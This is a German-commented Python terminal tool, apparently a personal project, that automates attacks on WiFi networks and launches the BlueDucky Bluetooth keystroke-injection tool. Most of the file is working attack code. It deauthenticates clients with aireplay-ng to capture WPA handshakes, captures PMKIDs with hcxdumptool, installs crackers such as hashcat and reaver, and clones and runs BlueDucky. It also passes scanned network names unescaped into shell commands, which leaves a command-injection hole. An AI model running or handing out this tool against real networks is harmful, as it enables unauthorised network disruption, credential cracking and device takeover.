import curses
import subprocess
import os
import time
import signal
import threading
import re
import sys

# --- Dynamische Pfad-Konfiguration ---
# Wir nutzen das aktuelle Verzeichnis des Benutzers, um Berechtigungsfehler zu vermeiden
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURE_DIR = os.path.join(BASE_DIR, "captures")
BLUEDUCKY_DIR = os.path.join(BASE_DIR, "BlueDucky")
INTERFACE = "wlan0"
MONITOR_INTERFACE = "wlan0mon"

# Erstelle Capture-Verzeichnis, falls es nicht existiert
try:
    if not os.path.exists(CAPTURE_DIR):
        os.makedirs(CAPTURE_DIR)
except PermissionError:
    print(f"FEHLER: Keine Schreibrechte in {BASE_DIR}. Bitte mit 'sudo' starten!")
    sys.exit(1)

class WifiTools:
    def __init__(self, stdscr):
        self.stdscr = stdscr
        self.networks = []
        self.selected_network = None
        self.stop_attack = False
        self.current_attack_process = None
        
        # Curses Setup
        curses.curs_set(0)
        self.stdscr.nodelay(1)
        self.stdscr.timeout(100)
        self.init_colors()
        
    def init_colors(self):
        curses.start_color()
        curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)  # Header
        curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK) # Success/Buttons
        curses.init_pair(3, curses.COLOR_RED, curses.COLOR_BLACK)   # Errors/Quit
        curses.init_pair(4, curses.COLOR_WHITE, curses.COLOR_BLUE)  # Selection

    def draw_header(self):
        h, w = self.stdscr.getmaxyx()
        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
        self.stdscr.addstr(0, (w // 2) - 5, "Wifi tools")
        self.stdscr.addstr(0, 2, "by Just")
        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
        self.stdscr.hline(1, 0, "-", w)

    def draw_menu(self, options, selected_idx):
        h, w = self.stdscr.getmaxyx()
        for idx, option in enumerate(options):
            x = w // 2 - len(option) // 2
            y = h // 2 - len(options) // 2 + idx
            if idx == selected_idx:
                self.stdscr.attron(curses.color_pair(4))
                self.stdscr.addstr(y, x, f" {option} ")
                self.stdscr.attroff(curses.color_pair(4))
            else:
                self.stdscr.addstr(y, x, f"  {option}  ")

    def run_command(self, cmd):
        try:
            return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        except subprocess.CalledProcessError as e:
            return e.output.decode()

    def install_all_tools(self):
        self.stdscr.clear()
        self.draw_header()
        self.stdscr.addstr(3, 2, "Installiere alle Wifite-Tools und BlueDucky...")
        self.stdscr.refresh()
        
        commands = [
            "sudo apt-get update",
            "sudo apt-get install -y aircrack-ng hcxtools hcxdumptool reaver bully pixiewps hashcat cowpatty tshark",
            "sudo apt-get install -y python3-pip git bluez bluez-tools libbluetooth-dev",
            f"if [ ! -d {BLUEDUCKY_DIR} ]; then git clone https://github.com/marcelo-vaz/BlueDucky {BLUEDUCKY_DIR}; fi",
            f"cd {BLUEDUCKY_DIR} && sudo pip3 install -r requirements.txt"
        ]
        
        for cmd in commands:
            self.stdscr.addstr(5, 2, f"Führe aus: {cmd[:50]}...")
            self.stdscr.refresh()
            self.run_command(cmd)
            
        self.stdscr.addstr(10, 2, "Installation abgeschlossen! Drücke eine Taste.", curses.color_pair(2))
        self.stdscr.getch()

    def run_blueducky(self):
        self.stdscr.clear()
        self.draw_header()
        if not os.path.exists(BLUEDUCKY_DIR):
            self.stdscr.addstr(3, 2, "BlueDucky nicht installiert. Bitte zuerst 'Install' nutzen.", curses.color_pair(3))
            self.stdscr.getch()
            return

        self.stdscr.addstr(3, 2, "Starte BlueDucky... (Beenden mit Strg+C)")
        self.stdscr.refresh()
        time.sleep(1)
        
        curses.endwin()
        os.system(f"cd {BLUEDUCKY_DIR} && sudo python3 BlueDucky.py")
        
        self.stdscr.clear()
        self.draw_header()
        self.stdscr.addstr(5, 2, "BlueDucky beendet. Drücke eine Taste.")
        self.stdscr.refresh()
        self.stdscr.getch()

    def enable_monitor_mode(self):
        self.stdscr.clear()
        self.draw_header()
        self.stdscr.addstr(3, 2, "Aktiviere Monitor-Modus...")
        self.stdscr.refresh()
        
        iw_output = self.run_command("iw dev")
        if "type monitor" in iw_output:
            return True
            
        self.run_command(f"sudo airmon-ng start {INTERFACE}")
        time.sleep(2)
        return "type monitor" in self.run_command("iw dev")

    def scan_networks(self):
        self.stdscr.clear()
        self.draw_header()
        self.stdscr.addstr(3, 2, "Scanne WLANs... Bitte warten (15s)")
        self.stdscr.refresh()
        
        scan_file = "/tmp/scan-01.csv"
        if os.path.exists(scan_file): os.remove(scan_file)
        
        process = subprocess.Popen(
            f"sudo airodump-ng {MONITOR_INTERFACE} --write /tmp/scan --output-format csv",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid
        )
        
        time.sleep(15)
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        
        networks = []
        if os.path.exists(scan_file):
            with open(scan_file, "r") as f:
                lines = f.readlines()
                start_parsing = False
                for line in lines:
                    if "BSSID, First time seen" in line:
                        start_parsing = True
                        continue
                    if start_parsing and line.strip() == "":
                        break
                    if start_parsing:
                        parts = line.split(",")
                        if len(parts) > 13:
                            bssid = parts[0].strip()
                            channel = parts[3].strip()
                            essid = parts[13].strip()
                            if essid:
                                networks.append({"bssid": bssid, "channel": channel, "essid": essid})
        return networks

    def select_network_menu(self):
        self.networks = self.scan_networks()
        if not self.networks:
            self.stdscr.addstr(5, 2, "Keine Netzwerke gefunden. Drücke eine Taste.")
            self.stdscr.getch()
            return None

        selected_idx = 0
        while True:
            self.stdscr.clear()
            self.draw_header()
            self.stdscr.addstr(2, 2, "Wähle ein Netzwerk:")
            
            h, w = self.stdscr.getmaxyx()
            for idx, net in enumerate(self.networks):
                if idx >= h - 5: break
                text = f"{idx+1}. {net['essid']} ({net['bssid']}) - Ch: {net['channel']}"
                if idx == selected_idx:
                    self.stdscr.attron(curses.color_pair(4))
                    self.stdscr.addstr(4 + idx, 2, text)
                    self.stdscr.attroff(curses.color_pair(4))
                else:
                    self.stdscr.addstr(4 + idx, 2, text)
            
            key = self.stdscr.getch()
            if key == curses.KEY_UP and selected_idx > 0:
                selected_idx -= 1
            elif key == curses.KEY_DOWN and selected_idx < len(self.networks) - 1:
                selected_idx += 1
            elif key == 10: # Enter
                return self.networks[selected_idx]
            elif key == ord('q'):
                return None

    def perform_attack(self, network):
        attacks = [
            ("Deauthentication", self.attack_deauth),
            ("PMKID Attack", self.attack_pmkid),
            ("Passive Capture", self.attack_passive)
        ]
        
        for name, attack_func in attacks:
            self.stdscr.clear()
            self.draw_header()
            self.stdscr.addstr(3, 2, f"Starte Attacke: {name} auf {network['essid']}")
            self.stdscr.refresh()
            
            success = attack_func(network)
            if success:
                self.stdscr.addstr(10, 2, f"ERFOLG! Handshake gespeichert in {CAPTURE_DIR}", curses.color_pair(2))
                self.stdscr.getch()
                return True
            
            self.stdscr.addstr(12, 2, "Attacke fehlgeschlagen oder abgebrochen.")
            self.stdscr.addstr(13, 2, "Drücke 'c' für nächste Attacke oder 'e' zum Beenden.")
            
            while True:
                key = self.stdscr.getch()
                if key == ord('c'):
                    break
                elif key == ord('e'):
                    return False
                time.sleep(0.1)
        
        return False

    def attack_deauth(self, network):
        self.run_command(f"sudo iwconfig {MONITOR_INTERFACE} channel {network['channel']}")
        cap_file = os.path.join(CAPTURE_DIR, f"{network['essid']}_handshake")
        airodump = subprocess.Popen(
            f"sudo airodump-ng -c {network['channel']} --bssid {network['bssid']} -w {cap_file} {MONITOR_INTERFACE}",
            shell=True, preexec_fn=os.setsid
        )
        
        start_time = time.time()
        while time.time() - start_time < 300:
            self.run_command(f"sudo aireplay-ng -0 5 -a {network['bssid']} {MONITOR_INTERFACE}")
            if os.path.exists(f"{cap_file}-01.cap"):
                check = self.run_command(f"aircrack-ng {cap_file}-01.cap")
                if "1 handshake" in check:
                    os.killpg(os.getpgid(airodump.pid), signal.SIGTERM)
                    return True
            
            key = self.stdscr.getch()
            if key == 3: # Ctrl+C
                os.killpg(os.getpgid(airodump.pid), signal.SIGTERM)
                return False
            time.sleep(10)
            
        os.killpg(os.getpgid(airodump.pid), signal.SIGTERM)
        return False

    def attack_pmkid(self, network):
        cap_file = os.path.join(CAPTURE_DIR, f"{network['essid']}_pmkid.pcapng")
        cmd = f"sudo hcxdumptool -i {MONITOR_INTERFACE} -o {cap_file} --enable_status=1"
        process = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
        
        start_time = time.time()
        while time.time() - start_time < 300:
            key = self.stdscr.getch()
            if key == 3: # Ctrl+C
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                return False
            time.sleep(1)
            
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        return os.path.exists(cap_file)

    def attack_passive(self, network):
        cap_file = os.path.join(CAPTURE_DIR, f"{network['essid']}_passive")
        airodump = subprocess.Popen(
            f"sudo airodump-ng -c {network['channel']} --bssid {network['bssid']} -w {cap_file} {MONITOR_INTERFACE}",
            shell=True, preexec_fn=os.setsid
        )
        
        start_time = time.time()
        while time.time() - start_time < 300:
            if os.path.exists(f"{cap_file}-01.cap"):
                check = self.run_command(f"aircrack-ng {cap_file}-01.cap")
                if "1 handshake" in check:
                    os.killpg(os.getpgid(airodump.pid), signal.SIGTERM)
                    return True
            
            key = self.stdscr.getch()
            if key == 3: # Ctrl+C
                os.killpg(os.getpgid(airodump.pid), signal.SIGTERM)
                return False
            time.sleep(10)
            
        os.killpg(os.getpgid(airodump.pid), signal.SIGTERM)
        return False

    def main_loop(self):
        options = ["Handshake", "Install", "BlueDucky", "Quit"]
        selected_idx = 0
        
        while True:
            self.stdscr.clear()
            self.draw_header()
            self.draw_menu(options, selected_idx)
            self.stdscr.refresh()
            
            key = self.stdscr.getch()
            
            if key == curses.KEY_UP and selected_idx > 0:
                selected_idx -= 1
            elif key == curses.KEY_DOWN and selected_idx < len(options) - 1:
                selected_idx += 1
            elif key == 10: # Enter
                if selected_idx == 0: # Handshake
                    if self.enable_monitor_mode():
                        net = self.select_network_menu()
                        if net:
                            self.perform_attack(net)
                    else:
                        self.stdscr.addstr(10, 2, "Fehler: Monitor-Modus konnte nicht aktiviert werden.", curses.color_pair(3))
                        self.stdscr.getch()
                elif selected_idx == 1: # Install
                    self.install_all_tools()
                elif selected_idx == 2: # BlueDucky
                    self.run_blueducky()
                elif selected_idx == 3: # Quit
                    break
            elif key == ord('q'):
                break

def main(stdscr):
    # Prüfe auf Root-Rechte
    if os.geteuid() != 0:
        curses.endwin()
        print("FEHLER: Dieses Skript muss mit 'sudo' ausgeführt werden!")
        sys.exit(1)
        
    app = WifiTools(stdscr)
    app.main_loop()

if __name__ == "__main__":
    try:
        curses.wrapper(main)
    except KeyboardInterrupt:
        pass
